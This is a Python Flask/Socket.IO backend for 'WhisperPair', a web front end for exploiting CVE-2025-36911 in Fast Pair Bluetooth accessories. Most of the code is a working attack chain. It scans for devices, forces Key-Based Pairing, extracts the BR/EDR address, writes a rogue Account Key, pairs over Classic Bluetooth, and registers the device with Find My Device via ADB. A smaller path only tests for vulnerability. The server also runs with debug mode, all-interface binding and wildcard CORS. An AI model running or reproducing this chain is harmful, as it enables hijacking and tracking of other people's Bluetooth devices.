#!/usr/bin/env python3
"""
WhisperPair Web Interface - Backend
Flask + Socket.IO server wrapping fast_pair_demo.py
"""

import asyncio
import threading
import time
from datetime import datetime
from dataclasses import asdict

from flask import Flask, jsonify
from flask_cors import CORS
from flask_socketio import SocketIO, emit

from fast_pair_demo import (
    ExploitStrategy,
    WhisperPairExploit,
    scan_for_targets,
    build_raw_kbp_request,
    build_retroactive_request,
    build_extended_request,
    parse_kbp_response,
    calculate_entropy,
    pair_classic_bluetooth,
    connect_classic_bluetooth,
    aes_encrypt,
    CHAR_KEY_PAIRING,
    CHAR_PASSKEY,
    CHAR_ACCOUNT_KEY,
    CHAR_MODEL_ID,
    MessageType,
)

import secrets

from adb_manager import ADBManager
from known_devices import lookup_device, KNOWN_DEVICES

adb = ADBManager()
selected_adb_device = None

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# Cached state
discovered_devices = []
active_exploit = None
exploit_cancel = threading.Event()

STRATEGIES = {
    "RAW_KBP": {
        "name": "RAW_KBP",
        "label": "Raw KBP",
        "description": "Raw unencrypted Key-Based Pairing request. Most common for vulnerable devices.",
        "flags": "0x11",
        "value": int(ExploitStrategy.RAW_KBP),
    },
    "RAW_WITH_SEEKER": {
        "name": "RAW_WITH_SEEKER",
        "label": "Raw + Seeker Address",
        "description": "Raw KBP with seeker address included for bonding initiation.",
        "flags": "0x01",
        "value": int(ExploitStrategy.RAW_WITH_SEEKER),
    },
    "RETROACTIVE": {
        "name": "RETROACTIVE",
        "label": "Retroactive Pairing",
        "description": "Retroactive pairing flag bypass. Sets bonding + retroactive bits.",
        "flags": "0x0A",
        "value": int(ExploitStrategy.RETROACTIVE),
    },
    "EXTENDED_RESPONSE": {
        "name": "EXTENDED_RESPONSE",
        "label": "Extended Response",
        "description": "Requests extended response format from the device.",
        "flags": "0x10",
        "value": int(ExploitStrategy.EXTENDED_RESPONSE),
    },
}


# ==============================================================================
# REST ENDPOINTS
# ==============================================================================


@app.route("/api/status")
def api_status():
    return jsonify({
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "devices_cached": len(discovered_devices),
        "exploit_running": active_exploit is not None,
    })


@app.route("/api/devices")
def api_devices():
    return jsonify(discovered_devices)


@app.route("/api/strategies")
def api_strategies():
    return jsonify(list(STRATEGIES.values()))


@app.route("/api/known-devices")
def api_known_devices():
    return jsonify(KNOWN_DEVICES)


# ==============================================================================
# SOCKET.IO EVENTS
# ==============================================================================


@socketio.on("connect")
def handle_connect():
    emit("server:status", {"status": "connected"})


@socketio.on("adb:scan")
def handle_adb_scan():
    devices = adb.list_devices()
    for dev in devices:
        info = adb.get_device_info(dev["id"])
        dev.update(info)
    emit("adb:devices", {"devices": devices})


@socketio.on("adb:select")
def handle_adb_select(data):
    global selected_adb_device
    selected_adb_device = data.get("device_id")
    emit("adb:status", {
        "stage": "selected",
        "message": f"Selected device: {selected_adb_device}",
        "status": "success",
    })


@socketio.on("adb:pair")
def handle_adb_pair(data):
    device_id = data.get("device_id") or selected_adb_device
    br_edr_address = data.get("br_edr_address")

    if not device_id:
        emit("adb:status", {
            "stage": "error",
            "message": "No Android phone selected",
            "status": "error",
        })
        return

    if not br_edr_address:
        emit("adb:status", {
            "stage": "error",
            "message": "No BR/EDR address provided",
            "status": "error",
        })
        return

    def run_adb_pair():
        socketio.emit("adb:status", {
            "stage": "enabling_bt",
            "message": f"Enabling Bluetooth on {device_id}...",
            "status": "running",
        })
        adb.enable_bluetooth(device_id)

        socketio.emit("adb:status", {
            "stage": "pairing",
            "message": f"Pairing {device_id} with {br_edr_address}...",
            "status": "running",
        })
        paired = adb.pair_device(device_id, br_edr_address)

        if not paired:
            socketio.emit("adb:status", {
                "stage": "pairing",
                "message": "ADB pairing command failed",
                "status": "error",
            })
            return

        socketio.emit("adb:status", {
            "stage": "verifying",
            "message": "Verifying device registration...",
            "status": "running",
        })

        time.sleep(3)
        verified = adb.verify_paired(device_id, br_edr_address)

        if verified:
            socketio.emit("adb:status", {
                "stage": "complete",
                "message": "Device paired and registered with Find My Device",
                "status": "success",
                "br_edr_address": br_edr_address,
            })
        else:
            socketio.emit("adb:status", {
                "stage": "complete",
                "message": "Pairing sent but could not verify registration. Check your phone manually.",
                "status": "warning",
                "br_edr_address": br_edr_address,
            })

    thread = threading.Thread(target=run_adb_pair, daemon=True)
    thread.start()


@socketio.on("scan:start")
def handle_scan_start(data=None):
    duration = 10
    if data and "duration" in data:
        duration = min(int(data["duration"]), 30)

    def run_scan():
        global discovered_devices
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        socketio.emit("scan:status", {"status": "scanning", "duration": duration})

        try:
            devices = loop.run_until_complete(scan_for_targets(timeout=duration))
            discovered_devices = devices

            for dev in devices:
                enriched = dict(dev)
                db_entry = lookup_device(enriched.get("model_id"))
                if db_entry:
                    enriched["known_name"] = db_entry["name"]
                    enriched["manufacturer"] = db_entry["manufacturer"]
                    enriched["device_type"] = db_entry["type"]
                else:
                    enriched["known_name"] = None
                    enriched["manufacturer"] = None
                    enriched["device_type"] = None
                socketio.emit("scan:device_found", enriched)
                time.sleep(0.1)

            socketio.emit("scan:complete", {
                "count": len(devices),
                "duration": duration,
            })
        except Exception as e:
            socketio.emit("scan:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()


@socketio.on("exploit:start")
def handle_exploit_start(data):
    global active_exploit
    exploit_cancel.clear()

    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_exploit():
        global active_exploit
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(
                _run_exploit_chain(address, strategies)
            )
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            active_exploit = None
            loop.close()

    active_exploit = address
    thread = threading.Thread(target=run_exploit, daemon=True)
    thread.start()


@socketio.on("exploit:stop")
def handle_exploit_stop():
    global active_exploit
    exploit_cancel.set()
    active_exploit = None
    emit("exploit:stage", {
        "stage": "cancelled",
        "message": "Exploit cancelled by user",
        "status": "error",
    })


@socketio.on("vuln_test:start")
def handle_vuln_test_start(data):
    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_vuln_test():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run_vuln_test(address, strategies))
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_vuln_test, daemon=True)
    thread.start()


# ==============================================================================
# EXPLOIT CHAIN (runs in background thread with event emissions)
# ==============================================================================


async def _run_exploit_chain(address: str, strategies: list):
    """Run exploit chain with real-time Socket.IO updates"""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
    }

    client = None
    shared_secret = None
    br_edr_address = None
    kbp_response = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal kbp_response, br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            kbp_response = data
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        if exploit_cancel.is_set():
            return
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if exploit_cancel.is_set():
                return
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")

            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts: {e}", "error")
                    result["message"] = f"Connection failed after {max_retries} attempts"
                    socketio.emit("exploit:result", result)
                    return
        else:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        if not client.is_connected:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 1.5: MTU negotiation
        try:
            mtu = client.mtu_size
            stage("mtu", f"MTU negotiated: {mtu} bytes", "success")
        except Exception:
            stage("mtu", "MTU negotiation not supported, using default", "warning")

        # Step 2: Read Model ID
        if exploit_cancel.is_set():
            return
        stage("model_id", "Reading Model ID...")

        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                model_id_str = f"0x{model_id:06X}"
                result["model_id"] = model_id_str
                db_entry = lookup_device(model_id_str)
                if db_entry:
                    stage("model_id",
                          f"Model ID: {model_id_str} ({db_entry['manufacturer']} {db_entry['name']})",
                          "success")
                else:
                    stage("model_id", f"Model ID: {model_id_str}", "success")
            else:
                stage("model_id", "Model ID: unknown format", "warning")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        if exploit_cancel.is_set():
            return
        stage("subscribe", "Subscribing to notifications...")

        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass

        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies
        kbp_accepted = False
        for strategy in strategies:
            if exploit_cancel.is_set():
                return

            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"Sending KBP request ({strategy_name})...")

            # Build request
            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)

                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                # Wait for notification
                stage("waiting_response", "Waiting for device response...")
                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break

            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"KBP rejected ({strategy_name}) - device may be patched", "error")
                else:
                    stage("kbp_request", f"KBP failed ({strategy_name}): {e}", "error")

                await asyncio.sleep(1)

        if not kbp_accepted:
            result["message"] = "All strategies rejected - device appears patched"
            stage("complete", result["message"], "error")
            socketio.emit("exploit:result", result)
            return

        # Step 5: Determine BR/EDR address
        if not br_edr_address:
            br_edr_address = address
            stage("address", f"Using BLE address as BR/EDR fallback: {address}", "warning")
        else:
            stage("address", f"BR/EDR address: {br_edr_address}", "success")

        result["br_edr_address"] = br_edr_address

        # Step 6: Write Account Key
        if exploit_cancel.is_set():
            return
        stage("account_key", "Writing Account Key...")

        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:16] = secrets.token_bytes(15)

        if shared_secret:
            data_to_write = aes_encrypt(shared_secret, bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        try:
            await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
            result["account_key_written"] = True
            stage("account_key", "Account Key written successfully", "success")
        except Exception as e:
            stage("account_key", f"Account Key write failed: {e}", "warning")

        # Step 7: Disconnect BLE
        await client.disconnect()
        client = None
        stage("disconnect", "BLE disconnected", "success")

        # Step 8: Classic Bluetooth pairing
        if exploit_cancel.is_set():
            return
        stage("bt_pair", f"Initiating Classic Bluetooth pairing with {br_edr_address}...")

        result["paired"] = pair_classic_bluetooth(br_edr_address)
        if result["paired"]:
            stage("bt_pair", "Classic Bluetooth pairing successful", "success")
            stage("bt_connect", "Connecting via Classic Bluetooth...")
            connected = connect_classic_bluetooth(br_edr_address)
            stage("bt_connect",
                  "Connected" if connected else "Connection failed (pairing still valid)",
                  "success" if connected else "warning")
        else:
            stage("bt_pair", "Classic Bluetooth pairing failed", "warning")

        # Final result
        result["success"] = result["vulnerable"] and (result["paired"] or result["account_key_written"])
        result["notifications"] = notifications
        result["message"] = "Exploit successful!" if result["success"] else "Partial success - device is vulnerable"

        stage("complete", result["message"], "success" if result["success"] else "warning")
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


async def _run_vuln_test(address: str, strategies: list):
    """Non-invasive vulnerability test: connect, send KBP, check response, disconnect.
    Does NOT write account key or attempt Classic BT pairing."""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
        "test_only": True,
    }

    client = None
    shared_secret = None
    br_edr_address = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")
            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts", "error")
                    result["message"] = "Connection failed"
                    socketio.emit("exploit:result", result)
                    return

        if not client or not client.is_connected:
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 2: Read Model ID
        stage("model_id", "Reading Model ID...")
        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                result["model_id"] = f"0x{model_id:06X}"
                stage("model_id", f"Model ID: 0x{model_id:06X}", "success")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        stage("subscribe", "Subscribing to notifications...")
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass
        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies (test only - just send KBP, no account key)
        kbp_accepted = False
        for strategy in strategies:
            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"[TEST] Sending KBP request ({strategy_name})...")

            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)
                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"[TEST] KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break
            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"[TEST] KBP rejected ({strategy_name})", "error")
                else:
                    stage("kbp_request", f"[TEST] KBP failed ({strategy_name}): {e}", "error")
                await asyncio.sleep(1)

        # Step 5: Determine result (no account key, no pairing)
        if br_edr_address:
            result["br_edr_address"] = br_edr_address

        if kbp_accepted:
            result["success"] = True
            result["message"] = "TEST COMPLETE: Device is VULNERABLE to CVE-2025-36911 (no exploit performed)"
            stage("complete", result["message"], "success")
        else:
            result["message"] = "TEST COMPLETE: Device appears patched"
            stage("complete", result["message"], "error")

        result["notifications"] = notifications
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


if __name__ == "__main__":
    print("WhisperPair Web Interface - Backend")
    print("http://localhost:5000")
    socketio.run(app, host="0.0.0.0", port=5000, debug=True)
